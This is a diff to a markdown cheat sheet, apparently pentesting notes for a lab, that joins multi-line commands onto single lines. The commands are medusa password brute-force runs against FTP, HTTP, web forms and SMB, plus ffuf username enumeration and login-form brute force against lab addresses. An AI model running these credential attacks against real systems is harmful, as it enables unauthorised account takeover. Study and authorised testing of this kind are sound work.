@@ -196,8 +196,7 @@ medusa -h 10.129.x.x -u admin -P passwords.txt -M ftp
 medusa -h 10.129.x.x -u admin -P passwords.txt -M http -m GET:/protected/
 
 # HTTP POST Form
-medusa -h 10.129.x.x -u admin -P passwords.txt -M web-form \
-  -m "FORM:username=&password=:FAIL=Invalid"
+medusa -h 10.129.x.x -u admin -P passwords.txt -M web-form -m "FORM:username=&password=:FAIL=Invalid"
 
 # SMB
 medusa -h 10.129.x.x -U users.txt -P passwords.txt -M smbnt
@@ -261,19 +260,11 @@ curl -s -X POST http://10.129.x.x/login -d "username=baduser&password=badpass" |
 
 ```bash
 # If different response length for valid user:
-ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-  -X POST -d "username=FUZZ&password=wrongpass" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -u http://10.129.x.x/login \
-  -fs <invalid_size>
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -d "username=FUZZ&password=wrongpass" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.129.x.x/login -fs <invalid_size>
 ```
 
 ### Brute Force After Username Enumeration
 
 ```bash
-ffuf -w passwords.txt \
-  -X POST -d "username=admin&password=FUZZ" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -u http://10.129.x.x/login \
-  -fs <failure_size>
+ffuf -w passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.129.x.x/login -fs <failure_size>
 ```
